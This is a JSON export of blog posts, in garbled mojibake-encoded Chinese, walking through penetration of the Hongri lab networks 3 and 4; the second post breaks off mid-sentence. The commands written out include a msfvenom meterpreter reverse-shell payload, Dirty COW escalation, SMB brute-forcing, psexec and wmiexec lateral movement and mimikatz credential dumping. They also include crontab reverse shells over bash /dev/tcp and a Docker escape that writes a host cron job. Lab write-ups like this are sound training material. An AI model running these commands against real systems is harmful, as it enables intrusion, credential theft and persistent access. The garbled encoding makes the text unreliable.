        "content": "çº¢æ—¥é¶åœº3 åœ¨å¼€å§‹ä¹‹å‰ï¼Œå¯ä»¥å…ˆçœ‹çœ‹æ–‡æœ«çš„æ€»ç»“é¿é¿å‘ğŸ‘‡\nç¯å¢ƒé…ç½® æ“ä½œçš„æ—¶å€™æŒ‰ç…§ç½‘ä¸Šæ¥çš„ï¼Œç»“æœé¢‘ç¹å‡ºé”™ï¼Œè¿‡ç¨‹ç•¥æ˜¾æ›²æŠ˜ï¼Œæœ€åé‡æ–°åˆ†æä¸€ä¸‹å…¶å®å¾ˆç®€å•ï¼š\nå…ˆé…ç½®ä¸€å¼ ä»…ä¸»æœºçš„ç½‘å¡vmnet2ï¼š192.168.93.0ï¼ˆåå­—å’ŒIPå›ºå®šçš„æœ€å¥½ä¸è¦ä¹±é…ï¼‰\nå†å°†æ‰€æœ‰æœºå™¨å…¨éƒ¨å¼€æœºï¼ˆæœ€å¥½å…ˆå¼€ubantuå†å¼€centosï¼Œå¦åˆ™å®¹æ˜“502ï¼‰ï¼Œç„¶åå°†centosçš„ç½‘å¡1æ”¹ä¸ºNATæ¨¡å¼å³å¯\nå®Œäº‹åï¼Œcentosé‡æ–°è·å–NATæ¨¡å¼ç½‘å¡ipï¼š\nservice network restart å®Œæ¯•ï¼Œå‡†å¤‡å¼€æ‰“\nä¿¡æ¯æœé›† IPæ¢æµ‹ nmapæ‰«ä¸€ä¸‹ç¡®å®šIPæ˜¯192.168.111.129\nç«¯å£æ¢æµ‹ å‘ç°å¼€æ”¾äº†22ã€80ã€3306ç«¯å£\nç½‘é¡µä¿¡æ¯æœé›† è®¿é—®80ç«¯å£ï¼š\nç½‘ç«™å¯ç”¨äº†Nginxåå‘ä»£ç†ï¼Œcmsæ˜¯å¾ˆç»å…¸çš„joomlaï¼Œä½†ä¸çŸ¥é“ç‰ˆæœ¬å·ï¼Œæ‰«æ‰«ç›®å½•ï¼š\nåœ¨README.txtå‘ç°äº†ç‰ˆæœ¬å·ï¼š\nå¯çŸ¥ç‰ˆæœ¬ä¸º3.9ï¼Œæ¯”è¾ƒæ–°ï¼ˆç›¸è¾ƒé¶åœºå‘å¸ƒçš„æ—¶é—´ğŸ˜ï¼‰\nè¿˜å‘ç°æœ‰ä¸ªconfiguration.php~ï¼Œç–‘ä¼¼é…ç½®æ–‡ä»¶ï¼Œçœ‹çœ‹ï¼š æ³„éœ²äº†ä¸€ä¸ªmysqlç”¨æˆ·å¯†ç \næ¼æ´åˆ©ç”¨ mysqlé‡ç½®ç®¡ç†å‘˜å¯†ç  å› ä¸ºç«¯å£å¼€å¯äº†3306ï¼Œç›´æ¥è¿æ¥è¯•è¯•ï¼š\nmysql -h 192.168.111.129 -utestuser -pcvcvgjASD!@ æˆåŠŸè¿æ¥mysqlï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„æ€è€ƒå°±æ˜¯è·å–åå°çš„ç®¡ç†å‘˜å¯†ç ï¼Œå¦‚æœä¸è¡Œå†è€ƒè™‘å†™webshell\nç”±äºå‘½ä»¤è¡Œæœ‰ç‚¹éº»çƒ¦ï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨navicatè¿æ¥mysqlï¼š\nå‘ç°adminè´¦æˆ·å’Œå¯†ç å“ˆå¸Œ\næŸ¥è¯¢ä¸€ä¸‹åŠ å¯†æ–¹å¼ä¹‹ç±»çš„ï¼š\næ‰¾åˆ°ä¸€ä¸ªsecretå¯†ç çš„çš„å“ˆå¸Œï¼Œç›´æ¥é‡ç½®ç®¡ç†å‘˜å¯†ç ï¼š æ¥ä¸‹æ¥ç™»å½•åå°\nåå°å†™é©¬ä¸Šçº¿Ubuntu ç™»å½•æˆåŠŸ\næ¥ä¸‹æ¥å°±æ˜¯æ‰¾èƒ½ç¼–è¾‘phpçš„åœ°æ–¹\nå‘ç°æ¨¡æ¿Beez3ï¼Œè€æ¼”å‘˜äº†ï¼Œæ‰“DCçš„æ—¶å€™å°±é‡åˆ°è¿‡ï¼š\nç›´æ¥ç¼–è¾‘ï¼š\nå†™ä¸ªåé—¨ï¼Œä¿å­˜åè¿æ¥è¯•è¯•ï¼š ç›´æ¥å°±ä¸Šçº¿äº†ï¼Œæ‰§è¡Œå‘½ä»¤çœ‹çœ‹ä¿¡æ¯ï¼š\nå…¨éƒ¨å¤±è´¥ï¼Œç›²çŒœæœ‰disable_functionsï¼Œåœ¨Beez3åˆ›å»ºä¸€ä¸ªphpinfo.phpçœ‹çœ‹ï¼š\nè®¿é—®ï¼š\nå¯è§ç¦ç”¨äº†exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_sourceç­‰å‡½æ•°ï¼Œè¯•è¯•ç”¨èšå‰‘çš„æ’ä»¶æ¥ç»•è¿‡\né€‰æ‹©PHP7_UserFilteræ¨¡å¼ç»•è¿‡ï¼š\næˆåŠŸï¼š\né¡ºä¾¿å‘ç°äº†ä¸»æœºå†…ç½‘IPä¸ºï¼š192.168.93.120\nç»§ç»­ä¿¡æ¯æ”¶é›†ä¸€ä¸‹ï¼š\nä¸»æœºæ˜¯ubuntu 4.4.0ï¼Œç»§ç»­ï¼š\nåœ¨tmpç›®å½•å‘ç°äº†ä¸€å¯¹è´¦å¯†ï¼Œå›æƒ³ä¸€ä¸‹è¿˜æœ‰å“ªé‡Œèƒ½ä½¿ç”¨å¯†ç ï¼Œå¾ˆæ˜æ˜¾æ˜¯22ç«¯å£çš„sshæœåŠ¡\nsshå¯†ç æ³„éœ²ä¸Šçº¿CentOS è¿æ¥è¯•è¯•ï¼š\nï¼ˆæˆ‘è¿™é‡Œéœ€è¦æŒ‡å®šä½¿ç”¨ssh-rsaå¯†é’¥ç±»å‹æ‰èƒ½è¿æ¥ï¼‰\nè¿æ¥æˆåŠŸåçœ‹çœ‹åŸºæœ¬ä¿¡æ¯ï¼š\nå‘ç°ä¸»æœºæ˜¯å˜æˆlinux 6.5äº†ï¼ŒIPä¸º192.168.111.129ï¼Œå†…ç½‘IPä¸º192.168.93.100è€Œå‰é¢æˆ‘ä»¬ç½‘é¡µä¿¡æ¯æ”¶é›†çŸ¥é“ç½‘ç«™é‡‡ç”¨äº†Nginxåå‘ä»£ç†ï¼Œé‚£ä¹ˆæ¨æµ‹ï¼š\nNginxåå‘ä»£ç†å°†å†…ç½‘çš„ubuntuï¼ˆ192.168.93.120ï¼‰ä¸Šçš„Joomlaä»£ç†åˆ°äº†CentOSï¼ˆ192.168.111.129|192.168.93.100ï¼‰ä¸Š æ‰€ä»¥åœ¨centosä¸ŠæŸ¥çœ‹Nginxé…ç½®æ–‡ä»¶ï¼š\nOKï¼Œå‘ç°äº†Nginxåå‘ä»£ç†çš„æ ‡å¿—ï¼šproxy_pass\næ‰€ä»¥æˆ‘ä»¬çš„æ¨æµ‹æ­£ç¡®ï¼ŒçœŸæ­£çš„webæœåŠ¡è¿è¡Œåœ¨å†…ç½‘çš„Ubuntuä¸Š\nåæ¸—é€ CentOSææƒ å‰é¢ä¿¡æ¯æ”¶é›†å‘ç°centosç‰ˆæœ¬ä¸º6.5ï¼Œçœ‹çœ‹å†…æ ¸ç‰ˆæœ¬ï¼š å†…æ ¸ä¸º2.6.32-431.el6ï¼Œå®Œå…¨ç¬¦åˆè„ç‰›ææƒçš„æ¡ä»¶ï¼Œç›´æ¥åˆ©ç”¨ï¼š\næœ¬åœ°å‡†å¤‡å¥½åˆ©ç”¨ä»£ç ï¼Œå¼€å¯httpæœåŠ¡ï¼Œåœ¨Centosä¸Šä½¿ç”¨wgetä¸‹è½½åˆ©ç”¨æ–‡ä»¶\næ¥ä¸‹æ¥ç¼–è¯‘å¹¶èµ‹äºˆæƒé™ï¼Œå³å¯è¿è¡Œåˆ©ç”¨ç¨‹åºï¼š\ngcc -pthread dirty.c -o dirty -lcrypt \u0026amp;\u0026amp; chmod 777 dirty ./dirty 123456 è¿è¡Œå®Œæ¯•åç³»ç»Ÿä¼šæ–°å¢ä¸€ä¸ªåä¸ºfirefartï¼Œå¯†ç ä¸º123456çš„rootç”¨æˆ·ï¼Œç›´æ¥ç™»å½•ï¼š\nææƒæˆåŠŸ\nCentOSä¸Šçº¿MSF ä¸ºäº†æ–¹ä¾¿å†…ç½‘æ¸—é€æ“ä½œï¼Œæ‰€ä»¥è€ƒè™‘ä¸Šçº¿msf\né¦–å…ˆä½¿ç”¨msfç”Ÿæˆä¸€ä¸ªshellcodeï¼š\nmsfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.111.132 LPORT=7890 -f elf \u0026gt; mshell.elf åŒæ ·çš„æ–¹æ³•ä¸Šä¼ è‡³CentOSï¼š\nmsfé…ç½®ç›‘å¬ï¼š\nCentOSè¿è¡Œç¨‹åºï¼š æˆåŠŸä¸Šçº¿msfï¼š å†…ç½‘ä¿¡æ¯æ”¶é›† routeæŸ¥çœ‹ä¸€ä¸‹ï¼š\nç¡®å®æ˜¯ä¸€ä¸ªå¤–ç½‘IPä¸€ä¸ªå†…ç½‘IPï¼Œæ¥ä¸‹æ¥å¯¹å†…ç½‘IPæ‰€åœ¨ç½‘æ®µè¿›è¡Œæ¢æµ‹\nIPæ¢æµ‹ ä¸ºäº†æ–¹ä¾¿æ¢æµ‹ï¼Œéœ€è¦å…ˆé…ç½®è·¯ç”±ï¼š\nrun autoroute -s 192.168.93.0/24 bg use auxiliary/server/socks_proxy set version 4a set srvport 6677 run é…ç½®å®Œæˆï¼Œä½¿ç”¨auxiliary/scanner/discovery/udp_probeæ¨¡å—æ¥æ‰«æå†…ç½‘ä¸»æœºï¼š\nuse auxiliary/scanner/discovery/udp_probe set rhosts 192.168.93.0-255 set threads 5 run å¯è§é™¤äº†Ubuntuå’ŒCentOSï¼Œè¿˜å­˜åœ¨ä¸‰å°åŸŸåä¸ºTESTçš„åŸŸå†…ä¸»æœºï¼š\nWIN-8GA56TNV3MV ï¼š192.168.93.10ï¼ˆè¯¥ä¸»æœºè¿˜æ˜¯DNSæœåŠ¡å™¨ï¼Œæ¨æµ‹æ˜¯DCï¼‰ WIN2008 ï¼š192.168.93.20 WIN7 ï¼š192.168.93.30 ç«¯å£æ¢æµ‹ æ¥ä¸‹æ¥æ‰«æç«¯å£ï¼š\nuse auxiliary/scanner/portscan/tcp set RHOSTS [ä¸»æœºIP] run æ¨ªå‘ç§»åŠ¨ SMBçˆ†ç ´win2008 æ³¨æ„åˆ°éƒ½å¼€å¯äº†445ç«¯å£ï¼Œæ‰€ä»¥å°è¯•ä¸€ä¸‹SMBçˆ†ç ´\nå…ˆè¯•è¯•è¾ƒè€çš„win2008ï¼š\nuse auxiliary/scanner/smb/smb_login set RHOSTS 192.168.93.30 set pass_file /home/kali/æ¡Œé¢/pass.txt set SMBUser administrator run çˆ†ç ´å‡ºå¯†ç ä¸º123qwe!ASD\npsexecæ¨ªå‘ç§»åŠ¨getshell åŸŸæˆå‘˜ä¸»æœº æœ‰äº†å¯†ç ç›´æ¥psexecè¿æ¥ï¼š\nuse exploit/windows/smb/psexec set payload windows/x64/meterpreter/bind_tcp set SMBUser administrator set SMBPass 123qwe!ASD set RHOSTS 192.168.93.20 run ç›´æ¥è·å¾—äº†systemæƒé™çš„shell\nçœ‹çœ‹ç³»ç»Ÿä¿¡æ¯ï¼š\nå‘ç°åŸŸä¸ºtest.org\nåŒç†ï¼Œç”¨psexecå°è¯•è¿æ¥win 7ï¼š\næˆåŠŸ\nwmiexecæ§åˆ¶DC å·²ç»æ§åˆ¶äº†ä¸¤å°åŸŸæˆå‘˜ä¸»æœºäº†ï¼Œç°åœ¨è¯•è¯•åŒæ ·çš„æ–¹æ³•æ‹¿åŸŸæ§ï¼š\nå¤±è´¥äº†\nå’Œçº¢æ—¥2ä¸€æ ·çš„æ€è·¯ï¼Œmimikatzå¯åŠ¨\nç”±äºæ„Ÿè§‰ä¸Šä¼ mimikatzæ¯”è¾ƒéº»çƒ¦æ‰€ä»¥ä½¿ç”¨msfä¸­çš„mimikatzï¼Œé¦–å…ˆè¿›å…¥win2008çš„sessionsï¼Œå†å¼€å§‹ä½¿ç”¨ï¼š\nåŠ è½½kiwiæ¨¡å—\nload kiwi æŠ“å–ä¸€ä¸‹å¯†ç ï¼š\nkiwi_cmd sekurlsa::logonPasswords æŠ“å–åˆ°å¯†ç ä¸ºï¼šzxcASDqw123!!\nå†æ¬¡å°è¯•psexecæ¨ªå‘ç§»åŠ¨ï¼š\nå¤±è´¥ï¼Œè¯•è¯•wmiexecï¼Œæˆ‘çš„imapcketå¥—ä»¶åœ¨windowsä¸Šæ‰€ä»¥è¦å†é…ä¸€ä¸‹ä»£ç†\nå…ˆç”¨proxifieré…ç½®ä¸€ä¸‹ï¼š\nç„¶åç›´æ¥å¯åŠ¨wmiexecï¼š\n./wmiexec_windows.exe administrator:zxcASDqw123!!@192.168.93.10 ç›´æ¥getshelläº†ï¼Œæ¥ä¸‹æ¥æ‰¾æ‰¾é¶åœºæè¿°çš„é‡è¦æ–‡ä»¶ï¼š æˆåŠŸæ‹¿åˆ°flag\næƒé™ç»´æŒ è¿™é‡Œé€‰æ‹©å¯¹è¿æ¥å¤–ç½‘çš„CentOSä¸»æœºè¿›è¡Œç»´æŒï¼Œæ€è·¯æ˜¯é€šè¿‡crontabå‘½ä»¤å°†åå¼¹shellçš„è„šæœ¬å†™å…¥å®šæ—¶ä»»åŠ¡å®ç°æƒé™ç»´æŒï¼š\næ‰§è¡Œå‘½ä»¤crontab -eç®¡ç†å®šæ—¶ä»»åŠ¡\næ·»åŠ ä»»åŠ¡ï¼š\n* * * * * bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.111.132/8888 0\u0026gt;\u0026amp;1 æŸ¥çœ‹å½“å‰ä»»åŠ¡åˆ—è¡¨ï¼š\ncrontab -l å¦‚æ­¤ï¼Œåªéœ€ncç›‘å¬å³å¯è·å¾—rootæƒé™çš„åå¼¹shellï¼š\nè‡³æ­¤ï¼Œå®Œæˆäº†ä¸€å¥—å®Œæ•´çš„æ¸—é€æµç¨‹ï¼ˆç—•è¿¹æ¸…ç†é™¤å¤–ï¼‰\næ€»ç»“ å‘ç‚¹æ€»ç»“ è‡³æ­¤ç¬¬ä¸€æ¬¡æ‰“5å°ä¸»æœºçš„é¶åœºï¼Œè¿‡ç¨‹ç•¥æ˜¾æ›²æŠ˜ï¼Œæœ‰å¾ˆå¤šå‘ç‚¹ï¼Œè¿™é‡Œç®€å•è®°å½•ï¼š\nç¯å¢ƒæ­å»ºçš„æ—¶å€™ï¼Œvmwareç‰ˆæœ¬ä¸è¦è¿‡é«˜ï¼Œæˆ‘å°†vmwareä»17æ¢ä¸º16.2è§£å†³äº†å¾ˆå¤šè«åæŠ¥é”™ ç½‘å¡é…ç½®åŠ¡å¿…æŒ‰é¡ºåºè¿›è¡Œï¼Œå¦åˆ™å®¹æ˜“æŠ¥502ç½‘å…³é”™è¯¯ è¿›å…¥å†…ç½‘é…ç½®è·¯ç”±çš„æ—¶å€™å»ºè®®é€‰æ‹©socks4aï¼Œæœ¬äººé»˜è®¤çš„socks5å°±ä¸€ç›´ä»£ç†ä¸ä¸Š ç«¯å£æ‰«æå»ºè®®ç›´æ¥ä½¿ç”¨proxychainsä»£ç†nmapæ¥è¿›è¡Œæ‰«æï¼Œæˆ‘å½“æ—¶æ‡’å¾—æ”¹confæ–‡ä»¶å°±ç›´æ¥ç”¨çš„msfçš„tcpç«¯å£æ‰«æ msfçš„shellå¯èƒ½ä¸æ˜¯å¾ˆç¨³å®šï¼Œåœ¨getshellåå¯ä»¥å…ˆmigrateè¿›ç¨‹æ³¨å…¥ä¸€ä¸‹å†å±•å¼€å…¶ä»–æ“ä½œ å¦å¤–ï¼Œå¾ˆå¤šåœ°æ–¹éƒ½æœ‰ä¸åŒçš„åˆ©ç”¨æ‰‹æ®µï¼Œæ¯”å¦‚é™¤äº†mimikatzæ“ä½œlasassæŠ“å–å¯†ç ï¼Œè¿˜å¯ä»¥ä½¿ç”¨responderæ‰“ntlm relayæˆ–è€…ä½¿ç”¨mimikatzæ‰“zerologonæ¥è·å–ntlm hashï¼Œå†è¿›è¡Œpthæ”»å‡»\u0026hellip;\u0026hellip; çŸ¥è¯†ç‚¹æ€»ç»“ æ€»ç»“ä¸€ä¸‹çŸ¥è¯†ç‚¹ä¸ç›¸å…³æ“ä½œï¼š\nç›®å½•æ‰«ææ•æ„Ÿæ–‡ä»¶ï¼Œè·å–mysqlè´¦å·å¯†ç \njoomlaå†™webshellï¼Œè¿™é‡Œæ˜¯åˆ©ç”¨äº†joomlaåå°æœ‰ç¼–è¾‘phpæ¨¡æ¿çš„åŠŸèƒ½\ndirtycowææƒï¼Œæ›´å¤šç»†èŠ‚è§æˆ‘è¿™ç¯‡æ–‡ç« ï¼šlinuxå†…æ ¸ææƒ-Yuy0ung\nmimikatzæŠ“å–å¯†ç ï¼ŒåŸç†è¯·çœ‹ï¼šwindowsåè®®ä¹‹NTLM-Yuyung\nimpacketå¥—ä»¶çš„wmiexecå®ç°RCEï¼šropnop/impacket_static_binaries\n",
        "summary": "çº¢æ—¥é¶åœº3 åœ¨å¼€å§‹ä¹‹å‰ï¼Œå¯ä»¥å…ˆçœ‹çœ‹æ–‡æœ«çš„æ€»ç»“é¿é¿å‘ğŸ‘‡\nç¯å¢ƒé…ç½® æ“ä½œçš„æ—¶å€™æŒ‰ç…§ç½‘ä¸Šæ¥çš„ï¼Œç»“æœé¢‘ç¹å‡ºé”™ï¼Œè¿‡ç¨‹ç•¥æ˜¾æ›²æŠ˜ï¼Œæœ€åé‡æ–°åˆ†æä¸€ä¸‹å…¶å®å¾ˆç®€å•ï¼š\nå…ˆé…ç½®ä¸€å¼ ä»…ä¸»æœºçš„ç½‘å¡vmnet2ï¼š192.168.93.0ï¼ˆåå­—å’ŒIPå›ºå®šçš„æœ€å¥½ä¸è¦ä¹±é…ï¼‰\nå†å°†æ‰€æœ‰æœºå™¨å…¨éƒ¨å¼€æœºï¼ˆæœ€å¥½å…ˆå¼€ubantuå†å¼€centosï¼Œå¦åˆ™å®¹æ˜“502ï¼‰ï¼Œç„¶åå°†centosçš„ç½‘å¡1æ”¹ä¸ºNATæ¨¡å¼å³å¯\nå®Œäº‹åï¼Œcentosé‡æ–°è·å–NATæ¨¡å¼ç½‘å¡ipï¼š\nservice network restart å®Œæ¯•ï¼Œå‡†å¤‡å¼€æ‰“\nä¿¡æ¯æœé›† IPæ¢æµ‹ nmapæ‰«ä¸€ä¸‹ç¡®å®šIPæ˜¯192.168.111.129\nç«¯å£æ¢æµ‹ å‘ç°å¼€æ”¾äº†22ã€80ã€3306ç«¯å£\nç½‘é¡µä¿¡æ¯æœé›† è®¿é—®80ç«¯å£ï¼š\nç½‘ç«™å¯ç”¨äº†Nginxåå‘ä»£ç†ï¼Œcmsæ˜¯å¾ˆç»å…¸çš„joomlaï¼Œä½†ä¸çŸ¥é“ç‰ˆæœ¬å·ï¼Œæ‰«æ‰«ç›®å½•ï¼š\nåœ¨README.txtå‘ç°äº†ç‰ˆæœ¬å·ï¼š\nå¯çŸ¥ç‰ˆæœ¬ä¸º3.9ï¼Œæ¯”è¾ƒæ–°ï¼ˆç›¸è¾ƒé¶åœºå‘å¸ƒçš„æ—¶é—´ğŸ˜ï¼‰\nè¿˜å‘ç°æœ‰ä¸ªconfiguration.php~ï¼Œç–‘ä¼¼é…ç½®æ–‡ä»¶ï¼Œçœ‹çœ‹ï¼š æ³„éœ²äº†ä¸€ä¸ªmysqlç”¨æˆ·å¯†ç \næ¼æ´åˆ©ç”¨ mysqlé‡ç½®ç®¡ç†å‘˜å¯†ç  å› ä¸ºç«¯å£å¼€å¯äº†3306ï¼Œç›´æ¥è¿æ¥è¯•è¯•ï¼š\nmysql -h 192.168.111.129 -utestuser -pcvcvgjASD!@ æˆåŠŸè¿æ¥mysqlï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„æ€è€ƒå°±æ˜¯è·å–åå°çš„ç®¡ç†å‘˜å¯†ç ï¼Œå¦‚æœä¸è¡Œå†è€ƒè™‘å†™webshell\nç”±äºå‘½ä»¤è¡Œæœ‰ç‚¹éº»çƒ¦ï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨navicatè¿æ¥mysqlï¼š\nå‘ç°adminè´¦æˆ·å’Œå¯†ç å“ˆå¸Œ\næŸ¥è¯¢ä¸€ä¸‹åŠ å¯†æ–¹å¼ä¹‹ç±»çš„ï¼š\næ‰¾åˆ°ä¸€ä¸ªsecretå¯†ç çš„çš„å“ˆå¸Œï¼Œç›´æ¥é‡ç½®ç®¡ç†å‘˜å¯†ç ï¼š æ¥ä¸‹æ¥ç™»å½•åå°\nåå°å†™é©¬ä¸Šçº¿Ubuntu ç™»å½•æˆåŠŸ\næ¥ä¸‹æ¥å°±æ˜¯æ‰¾èƒ½ç¼–è¾‘phpçš„åœ°æ–¹\nå‘ç°æ¨¡æ¿Beez3ï¼Œè€æ¼”å‘˜äº†ï¼Œæ‰“DCçš„æ—¶å€™å°±é‡åˆ°è¿‡ï¼š\nç›´æ¥ç¼–è¾‘ï¼š\nå†™ä¸ªåé—¨ï¼Œä¿å­˜åè¿æ¥è¯•è¯•ï¼š ç›´æ¥å°±ä¸Šçº¿äº†ï¼Œæ‰§è¡Œå‘½ä»¤çœ‹çœ‹ä¿¡æ¯ï¼š\nå…¨éƒ¨å¤±è´¥ï¼Œç›²çŒœæœ‰disable_functionsï¼Œåœ¨Beez3åˆ›å»ºä¸€ä¸ªphpinfo.phpçœ‹çœ‹ï¼š\nè®¿é—®ï¼š\nå¯è§ç¦ç”¨äº†exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_sourceç­‰å‡½æ•°ï¼Œè¯•è¯•ç”¨èšå‰‘çš„æ’ä»¶æ¥ç»•è¿‡\né€‰æ‹©PHP7_UserFilteræ¨¡å¼ç»•è¿‡ï¼š\næˆåŠŸï¼š\né¡ºä¾¿å‘ç°äº†ä¸»æœºå†…ç½‘IPä¸ºï¼š192.168.93.120\nç»§ç»­ä¿¡æ¯æ”¶é›†ä¸€ä¸‹ï¼š\n"
    }
,
    {
        "title": "çº¢æ—¥é¶åœº04",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/%E7%BA%A2%E6%97%A5/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA04/",
        "content": "çº¢æ—¥é¶åœº04 ç¯å¢ƒé…ç½® è‡ªå®šä¹‰ä¸€å¼ ç½‘å¡ vmnet1ï¼š192.168.183.0\nå°†webä¸»æœºæ·»åŠ ä¸€ä¸ªNATæ¨¡å¼çš„ç½‘å¡ï¼Œå†å°†æ‰€æœ‰ä¸»æœºï¼ˆåŒ…æ‹¬webï¼‰æ·»åŠ  vmnet1ç½‘å¡\nå¯åŠ¨ä¸»æœºï¼Œå…ˆå¯åŠ¨win7åå†å¯åŠ¨webï¼ˆå¦åˆ™ç¯å¢ƒå®¹æ˜“å‡ºé—®é¢˜ï¼‰\nä¸»æœºå¯†ç ï¼š\nwebï¼šubuntu:ubuntu DCï¼šadministrator:Test2008ï¼ˆç™»å½•æç¤ºå¯†ç è¿‡æœŸï¼Œæˆ‘è¿™é‡Œæ›´æ”¹ä¸ºAdmin123456ï¼‰ win7ï¼šdouser:Dotest123 ä¸ºäº†æ–¹ä¾¿ï¼Œç™»å½•ä¸»æœºåå¯ä»¥å°†win7çš„ç¡çœ åŠŸèƒ½å…³æ‰ï¼Œå› ä¸ºè®¡ç®—æœºä¼‘çœ åsessionså¯èƒ½ä¼šæ–­å¼€ï¼š\nç™»å½•ubuntuï¼Œæ‰“å¼€å‘½ä»¤è¡Œï¼Œsudo -sæå‡ä¸ºrootæƒé™ï¼Œç„¶åå¯åŠ¨å®¹å™¨åˆ—è¡¨å‰ä¸‰ä¸ªdockerï¼š\nè‡³æ­¤ï¼Œç¯å¢ƒæ­å»ºå®Œæ¯•ï¼Œå‡†å¤‡å¼€æ‰“\nä¿¡æ¯æœé›† IPæ¢æµ‹ ç¡®å®šIPä¸º192.168.111.134\nç«¯å£æ‰«æ å‘ç°å¼€å¯äº†22ã€2001ã€2002ã€2003ç«¯å£\nç½‘é¡µä¿¡æ¯æ”¶é›† ä¾æ¬¡è®¿é—®ä¸‰ä¸ªç«¯å£çœ‹çœ‹ï¼š\n2001ç«¯å£ é€šè¿‡ç½‘é¡µtitleå¯çŸ¥æ˜¯struts2æ¡†æ¶ï¼Œè€Œstruts2å­˜åœ¨å¾ˆå¤šå†å²æ¼æ´ï¼Œé‚£ä¹ˆæ€è·¯å°±æ˜¯å¯¹è¿™ä¸ªè¾“å…¥æ¡†è¿›è¡Œæ¼æ´æ£€æµ‹\n2002ç«¯å£ é¡µé¢ä¸ºtomcatï¼Œç‰ˆæœ¬ä¸º8.5.19\nåŒæ ·å¯ä»¥ä½¿ç”¨æ¼æ‰«å™¨è¿›è¡Œæ¼æ´æ£€æµ‹\n2003ç«¯å£ é¡µé¢æ˜¯phpmyadminï¼Œä½†æˆ‘è¿™é‡Œå¥½åƒå‡ºé—®é¢˜äº†ï¼š\né—®é¢˜ä¸å¤§ï¼Œå¯ä»¥å…ˆå°è¯•å‰ä¸¤ä¸ªç«¯å£æœ‰æ²¡æœ‰æ¼æ´\næ¼æ´åˆ©ç”¨ 2001ç«¯å£ S2-045ä¸Šä¼ webshell é¦–å…ˆçœ‹çœ‹2001ç«¯å£çš„struts2ï¼Œé™„ä¸Šå·¥å…·é“¾æ¥ï¼šshack2/Struts2VulsTools æ‰«æå‘ç°å­˜åœ¨S2-045å’ŒS2-046ï¼Œé‚£ä¹ˆè¯•è¯•ç”¨S2-045åˆ©ç”¨ï¼š\nä¸Šä¼ ä¸€ä¸ªå†°èwebshellï¼š\nå†°èè¿æ¥ï¼š\næˆåŠŸäº†\n2002ç«¯å£ tomcatè§£ææ¼æ´ä¸Šä¼ webshell è¿™ä¸ªç‰ˆæœ¬çš„è¯ï¼Œå¯ä»¥è¯•è¯•putæ¼æ´ï¼š\nä¹Ÿæ˜¯æˆåŠŸä¸Šä¼ ä¸€ä¸ªå†°èé©¬ï¼Œè¿æ¥ä¸€ä¸‹ï¼š\nokè¿ä¸Šäº†ï¼Œå› ä¸º2003ç«¯å£æœ‰ç‚¹é—®é¢˜ï¼Œæ‰€ä»¥å°±åœ¨è¿™ä¸¤ä¸ªshellè¿›è¡Œåæ¸—é€\nåæ¸—é€ ç¯å¢ƒè¯†åˆ« å…ˆç®€å•ä¿¡æ¯æ”¶é›†ä¸€ä¸‹ï¼š\næƒé™éƒ½æ˜¯rootï¼Œä½†è¿™ipçœ‹èµ·æ¥ä¸å¤ªæ­£å¸¸å‘¢ï¼Œæ²¡æ‡‚\nçœ‹çœ‹ä¸»æœºåï¼š\néšæœºå­—ç¬¦ä¸²ï¼Œæœ‰ç‚¹åƒè™šæ‹Ÿå®¹å™¨å“ˆ\néªŒè¯ä¸‹çœ‹çœ‹æ˜¯ä¸æ˜¯dockerï¼š\nfind / -name .dockerenv ç»“æœå‘ç°ä¸¤ä¸ªshelléƒ½æ˜¯dockerï¼Œé‚£å°±åªæœ‰è¯•è¯•dockeré€ƒé€¸äº†\ndockeré€ƒé€¸ å°†CDKä¸Šä¼ åˆ°ä¸¤ä¸ªdockerä¸­è¿›è¡Œä¸å®‰å…¨é…ç½®æ‰«æï¼š\nèµ‹äºˆæƒé™å¹¶å¯åŠ¨cdkï¼š\n./cdk* eva --full é¦–å…ˆæ˜¯2001ç«¯å£çš„dockerï¼š\nä¸çŸ¥é“æ€ä¹ˆå›äº‹å¤±è´¥äº†ï¼Œå†çœ‹çœ‹2002ç«¯å£ï¼š è¿™é‡Œæ£€æµ‹åˆ°å½“å‰å®¹å™¨æ˜¯ä»¥ç‰¹æƒæ¨¡å¼å¯åŠ¨çš„ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨mountå‘½ä»¤å°†ç‰©ç†æœºç›®å½•æŒ‚è½½åˆ°dockerå®¹å™¨æŸä¸ªç›®å½•ï¼š\n./cdk* run mount-disk okï¼Œç”Ÿæˆäº†ç›®å½•/tmp/cdk_11VI1ï¼Œcdè¿›å»çœ‹çœ‹ï¼š\nç¡®å®æŒ‚è½½äº†æ ¹ç›®å½•ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å¯ä»¥è€ƒè™‘å†™è®¡åˆ’ä»»åŠ¡æˆ–è€…å†™SSHå¯†é’¥ï¼Œå‰è€…æ¯”è¾ƒç®€å•æ‰€ä»¥å…ˆè¯•è¯•ï¼š\necho \u0026#34;/bin/bash -i \u0026gt;\u0026amp; bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.111.132/4444 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; tmp/shell.sh chmod 777 tmp/shell.sh echo \u0026#39;*/2 * * * * root bash /tmp/shell.sh\u0026#39; \u0026gt; etc/crontab å†™å…¥è®¡åˆ’ä»»åŠ¡åkaliç›‘å¬æ‹¿åˆ°äº†ç‰©ç†æœºrootæƒé™çš„åå¼¹shellï¼š\næƒé™ä¸ºrootï¼Œè‡³æ­¤ï¼Œå®Œæˆdockeré€ƒé€¸\nå†…ç½‘ä¿¡æ¯æœé›† å‘ç°ä¸»æœºæœ‰å†…ç½‘ç½‘å¡ï¼š\nè¿™é‡Œé€‰æ‹©ä½¿ç”¨msfè¿›è¡Œæ¥ä¸‹æ¥çš„å†…ç½‘æ“ä½œ\né¦–å…ˆç”¨msfçš„é©¬å­ä¸Šçº¿ï¼Œæ— 